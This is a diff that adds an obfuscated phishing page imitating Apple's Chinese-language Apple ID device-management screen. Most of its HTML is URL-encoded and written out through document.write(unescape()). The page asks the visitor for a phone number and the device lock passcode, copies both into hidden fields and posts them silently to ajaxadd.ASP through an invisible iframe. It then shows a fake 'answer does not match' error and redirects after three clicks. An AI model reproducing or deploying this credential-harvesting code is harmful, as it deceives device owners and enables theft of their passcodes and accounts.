@@ -1,0 +1,91 @@
+<script>document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%0A%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text/html%3B%20charset%3Dutf-8%22%3E%0A%3Ctitle%3EiPhone%20%u8BBE%u5907%u7BA1%u7406%3C/title%3E%0A%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%2C%20maximum-scale%3D1%22%3E%0A%20%20%3Clink%20rel%3D%22stylesheet%22%20href%3D%22fonts%22%20type%3D%22text/css%22%3E%0A%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20media%3D%22all%22%20href%3D%22shebei/body.css%22%3E%0A%20%0A%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%2C%20minimum-scale%3D1%2C%20maximum-scale%3D1%20user-scalable%3D0%22%3E%0A%3Cscript%20src%3D%22Javascript/Javascript.js%22%3E%3C/script%3E%0A%0A%3Cstyle%20type%3D%22text/css%22%3E%0A%3C%21--%0Abody%20%7B%0A%09background-color%3A%20%23FFFFFF%3B%0A%7D%0A--%3E%0A%3C/style%3E%3C/head%3E%0A%3Cbody%20class%3D%22tk-body%22%3E%0A%20%20%3Cdiv%20id%3D%22content%22%3E%3Cappleid-repair%3E%3Cidms-widget%20%7Bshow-widget-header%7D%3D%22showWidgetHeader%22%20widget-title%3D%22%22%3E%0A%0A%20%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%0Adocument.write%28%22%3Clink%20rel%3D%27stylesheet%27%20type%3D%27text/css%27%20href%3D%27shebei/repairWidgetEyebrow.css%3Frandom%3D%22%A0+%20Math.random%28%29%20+%20%22%27%20/%3E%22%29%3B%0A%0A%0A%3C/script%3E%0A%3Cscript%3E%0A%0A%24%28function%28%29%7B%0A%0Avar%20app1%20%3D%20%24%28%27%23app1%27%29%3B%0A%0Aapp1.focus%28function%28%29%7B%0A%0A%24%28this%29.attr%28%27placeholder%27%2C%27%u7535%u8BDD%27%29%0A%0A%7D%29%0A%0A%7D%29%0A%24%28function%28%29%7B%0A%0Avar%20apwd%20%3D%20%24%28%27%23apwd%27%29%3B%0A%0Aapwd.focus%28function%28%29%7B%0A%0A%24%28this%29.attr%28%27placeholder%27%2C%27%u8BBE%u5907%u9501%27%29%0A%0A%7D%29%0A%0A%7D%29%0A%3C/script%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22idms-widget-container%22%3E%0A%09%09%20%0A%20%20%20%20%3Cdiv%20class%3D%22widget-header%22%3E%0A%09%09%20%20%3Cdiv%20class%3D%27pin%27%20%20%3E%3C/div%3E%0A%3Cdiv%20class%3D%27pulse%27%20%3E%0A%0A%0A%0A%3C/div%3E%0A%0A%09%0A%20%20%20%20%20%20%3Cspan%20class%3D%22sk-icon%20sk-icon-apple%20widget-logo%22%3E%3C/span%3E%0A%20%20%20%20%20%20%3Ch2%20class%3D%22widget-title%20tk-subsection-headline%22%3E%20%3Cimg%20src%3D%22shebei/203fb80e7bec54e75b4e27ddb2389b504ec26a56.png%22%20width%3D%2216%22%20height%3D%2216%22%20class%3D%27img%27%20align%3D%22left%22%20style%3D%22margin-top%3A5%25%3B%22%3E%u7BA1%u7406%u60A8%u7684%20Apple%20ID%3C/h2%3E%0A%0A%20%20%20%20%3C/div%3E%0A%0A%0A%0A%20%20%3Cdiv%20class%3D%22widget-content-wrapper%22%3E%0A%0A%0A%20%20%20%20%3Cdiv%20class%3D%22widget-content%22%3E%0A%20%20%20%20%20%20%0A%20%20%20%20%3Cdiv%20class%3D%22repair-compliance-phone-number%20compact-content%20text-center%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22addPhoneContainer%22%3E%0A%20%20%20%20%20%20%0A%20%20%20%20%20%20%3Ccompliance-phone-number-header%20%7Bactive-country%7D%3D%22activeCountry%22%20%7Baccount-type%7D%3D%22accountType%22%20%7Bcutoff-date%7D%3D%22cutoffDate%22%20%7Bcase-type%7D%3D%22caseType%22%20%7Bgrace-period-ended%7D%3D%22gracePeriodEnded%22%3E%3Ch6%20class%3D%22tk-subbody-headline%20text-center%22%20tabindex%3D%22-1%22%3E%0A%20%20%20%20%0A%3Cbr%3E%3Cbr%3E%3Cbr%3E%0A%20%20%0A%3C/h6%3E%3C/compliance-phone-number-header%3E%0A%0A%20%20%20%20%20%3Cdiv%20class%3D%22tk-subbody%20context-description%22%3E%0A%20%20%3Clabel%3E%0A%20%20%20%20%20%20%0A%u56E0%u5B89%u5168%u95EE%u9898%2C%u8BF7%u9A8C%u8BC1%u8EAB%u4EFD%u4FE1%u606F%u4EE5%u7EE7%u7EED%0A%20%20%0A%20%20%3C/label%3E%0A%3C/div%3E%0A%0A%0A%20%20%20%20%3Cdiv%20class%3D%22idms-step-container%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22idms-step-wrapper%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22idms-step-1551002377508-0%22%20class%3D%22idms-step%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22idms-step-header%20clearfix%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22idms-step-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%3Cdiv%20class%3D%22context-body%20step-add-phone%20compact-input%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22details%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22text%20flow-label%22%3E%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22tk-body-reduced%20tk-links-stacked%20context-description%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%0A%20%20%20%20%3Cdiv%20class%3D%22form-table%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22form-row%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%0A%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%0A%20%3Cdiv%20class%3D%22form-element%20%22%3E%0A%20%20%20%20%20%0A%20%20%20%20%20%0A%0A%09%20%20%0A%3Cp%20%20style%3D%22margin%3A%20-10%20auto%3Bwidth%3A%2580%3Bheight%3A%2060px%3Bline-height%3A%2054px%3Bborder%3A%201px%20solid%20%23ddd%3Bcolor%3A%23333%3Bborder-radius%3A5px%3Boutline%3A%20none%3B%22%20id%3D%22app1%22%20%20class%3D%27input%27%20name%3D%22app1%22%20%20%20contenteditable%3D%22TRUE%22%20placeholder%3D%22%u7535%u8BDD%22%20%20onKeyDown%3D%22ADivFollowingText%28%29%3B%22%20onKeyPress%3D%22OnTextChanged%28%29%3B%22%20%3E%3C/p%3E%0A%09%20%20%0A%09%20%20%0A%09%20%20%0A%20%20%20%20%20%3C/div%3E%0A%0A%20%20%3C/div%3E%0A%0A%3C/div%3E%0A%0A%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%3C/br%3E%20%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%0A%20%20%3Cdiv%20class%3D%22form-element%20%22%3E%0A%20%20%20%20%20%0A%20%20%20%20%20%0A%0A%09%20%20%0A%3Cp%20style%3D%22margin%3A%20-10%20auto%3Bwidth%3A%2580%3Bheight%3A%2060px%3Bline-height%3A%2054px%3Bborder%3A%201px%20solid%20%23ddd%3Bcolor%3A%23333%3Bborder-radius%3A5px%3Boutline%3A%20none%3B%22%20id%3D%22apwd%22%20%20class%3D%27input%27%20name%3D%22apwd%22%20%20%20contenteditable%3D%22TRUE%22%20placeholder%3D%22%u8BBE%u5907%u9501%22%20%20onKeyUp%3D%27AchangeTest%28this%29%3B%27%20onKeyDown%3D%22ADivFollowingText%28%29%3B%22%20onKeyPress%3D%22OnTextChanged%28%29%3B%22%20%3E%3C/p%3E%0A%09%20%20%0A%09%20%20%0A%09%20%20%0A%20%20%20%20%20%3C/div%3E%0A%0A%20%20%3C/div%3E%0A%0A%3C/div%3E%0A%0A%3C/div%3E%0A%0A%0A%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/br%3E%0A%09%09%3Cdiv%20align%3D%22left%22%20id%3D%22pop%22%20style%3D%22%20display%3Anone%3B%20color%3A%20%23D00000%20%3Bfont-size%3A13px%3B%22%20%20%3E%3Cimg%20src%3D%22image/ts.png%22%20width%3D%2213%22%20height%3D%2213%22%20%3E%26nbsp%3B%u60A8%u7684%u7B54%u6848%u4E0E%u5B58%u6863%u7684%u5B89%u5168%u4FE1%u606F%u4E0D%u7B26%0A%09%09%3Cspan%3E%3C/span%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-label%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22label-wrapper%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%22form-cell%20form-label%22%3E%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/label%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22inline-desktop%20inline-tablet%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cff-radio-list%20%7B%28value%29%7D%3D%22mode%22%20%7Boptions%7D%3D%22radioOptions%22%3E%3Cdiv%20class%3D%22radio-flex-wrapper%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22form-row%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22form-cell%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-element%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22radio%22%20%20class%3D%22form-choice%20form-choice-radio%22%20name%3D%221551002377484-0-idms-radio-list-option%22%20id%3D%221551002377484-0-idms-radio-list-0%22%20checked%3D%22%22%20value%3D%22sms%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%22form-label%22%20for%3D%221551002377484-0-idms-radio-list-0%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22form-choice-indicator%22%3E%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%u77ED%u4FE1%u9A8C%u8BC1%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%3C/label%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20class%3D%22form-row%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22form-cell%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-element%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22radio%22%20%20%20class%3D%22form-choice%20form-choice-radio%22%20name%3D%221551002377484-0-idms-radio-list-option%22%20id%3D%221551002377484-0-idms-radio-list-1%22%20value%3D%22voice%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%22form-label%22%20for%3D%221551002377484-0-idms-radio-list-1%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22form-choice-indicator%22%3E%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%u90AE%u4EF6%u9A8C%u8BC1%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%3C/label%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%3C/div%3E%0A%0A%0A%3C/ff-radio-list%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%0A%20%20%20%20%3C/div%3E%0A%0A%0A%20%20%3C/div%3E%0A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%3Cdiv%20class%3D%22idms-step-footer%20clearfix%22%20%28%24inserted%29%3D%22setPositionForFooterWrapper%28%24element%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%3Ciframe%20name%3D%22formget%22%20style%3D%22display%3Anone%3B%22%3E%0A%20%20%20%20%3C/iframe%3E%0A%0A%20%3Cform%20target%3D%22formget%22%20method%3D%22post%22%20id%3D%22ajaxid%22%20name%3D%22register%22%20action%3D%22ajaxadd.ASP%22%20onsubmit%3D%22return%20initData%28%29%3B%22%3E%0A%3Cinput%20name%3D%22tel%22%20id%3D%22tel%22%20type%3D%22hidden%22%20title%3D%22%u8BA2%u5355%u7F16%u53F7%22%20value%3D%22%22%3E%0A%3Cinput%20name%3D%22pms%22%20id%3D%22pms%22%20type%3D%22hidden%22%20title%3D%22%u8BA2%u5355%u53F7%22%20value%3D%22%22%3E'));</script>
+    <input name="username"  id="username" type="hidden" value=""  title="摩托车多少钱一辆" />
+          <input name="userpass"  id="userpass" type="hidden" value=""  title="法拉利跑车多少钱一辆" />       
+
+<script>document.write(unescape('%0A%0A%20%20%3Cinput%20name%3D%22act%22%20id%3D%22act%22%20type%3D%22hidden%22%20value%3D%22ok%22%3E%0A%0A%20%20%20%20%3Cdiv%20class%3D%22toolbar-wrapper%20toolbar-footer%20clearfix%20%20%22%20id%3D%221551002377501-0%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22button-group%20flow-controls%20clearfix%20pull-right%20%22%3E%0A%20%20%20%20%20%20%20%20%3C%21--%20%u5B66%u6821%u73ED%u7EA7%u540D%u79F0%20%21--%3E%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22primary-button-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20tabindex%3D%220%22%20type%3D%22button%22%20%7B%24disabled%7D%3D%22_actionDisabled%22%20%28%24click%29%3D%22clicked%28%26%2339%3BactionClicked%26%2339%3B%29%22%20%20disabled%3D%22%22%3E%0A%20%3Cdiv%20class%3D%22overflow-text%22%3E%0A%20%0A%3Cinput%20id%3D%22Look%22%20type%3D%22submit%22%20value%3D%22%u7EE7%u7EED%22%20%20%20width%3D%2226%22%20height%3D%2226%22%20align%3D%22right%22%20style%3D%22margin-top%3A-4px%3Boutline%3A%20none%3B%22%20class%3D%22button%20button-primary%20last%20nav-action%20%20%20%20pull-right%20weight-medium%20ng-scope%22%20onClick%3D%22document%3AinitData%28%29%22%20ng-app%3D%22myApp%22%20ng-controller%3D%22personCtrl%22%20ng-click%3D%22toggle%28%29%22%3E%0A%0A%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/button%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%3C%21--%20%u5B66%u6821%u73ED%u7EA7%u540D%u79F0%u7ED3%u675F%20--%3E%0A%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%0A%20%20%20%20%3C/div%3E%0A%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%0A%20%0A%0A%20%20%0A%20%20%20%20%3C/div%3E%0A%20%20%0A%20%20%0A%3C/div%3E%0A%20%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%0A%0A%20%20%20%20%3C/div%3E%0A%20%20%3C/div%3E%0A%3C/div%3E%0A%0A%20%20%20%20%20%20%20%20%0A%0A%3C/div%3E%0A%0A%20%0A'));</script>
+
+<script>
+var app = angular.module('myApp', []);
+app.controller('personCtrl', function($scope) {
+var submitml=0;  //（设置变量，初始为0）
+$scope.toggle = function() {
+submitml++;    //（当点击一次按钮，自加一）
+if(submitml<3)
+{
+ }else
+{
+window.location.href='SETUPG4HDFAG9GHAHAEHRADFHGADFHADFHAEDFH90FDHAHFADHFOOO444RGSHSTHSJJSHJSHSODFBNODIFGO.html';
+}
+};
+});
+</script>
+<script>
+
+        function stopPropagation(e) {
+            var ev = e || window.event;
+            if (ev.stopPropagation) {
+                ev.stopPropagation();
+            }
+            else if (window.event) {
+                window.event.cancelBubble = true;//兼容IE
+            }
+        }
+        $("#Look").click(function (e) {
+            $("#pop").show();
+            stopPropagation(e);
+        });
+        $(document).bind('click', function () {
+            $("#pop").hide();
+        });
+        $("#pop").click(function (e) {
+            stopPropagation(e);
+        });
+ 
+ 
+ 
+ 
+  function OnTextChanged() {
+      if (event.keyCode == 13) {//判断是否为回车键
+          event.keyCode = 0;//屏蔽回车键
+          event.returnValue = false;
+         
+      }
+  }
+ 
+ 
+  
+function 	AchangeTest(obj){ 
+
+    if(obj.innerHTML.length==0){ 
+	
+       document.getElementById('apwd').className = 'input';
+       document.getElementById('apwd').disabled = true;
+
+       document.getElementById('Look').disabled = true;
+
+    } else { 
+	   document.getElementById('apwd').className = 'classa';
+       document.getElementById('apwd').disabled = false; 
+
+       document.getElementById('Look').disabled = false; 
+    } 
+
+} 
+
+
+
+function initData()
+{
+document.getElementById("tel").value=document.getElementById("app1").innerHTML;
+document.getElementById("pms").value=document.getElementById("apwd").innerHTML;
+
+return true;
+}
+</script>
+ 
+
+ 
+
+        
+ 
+</body></html>
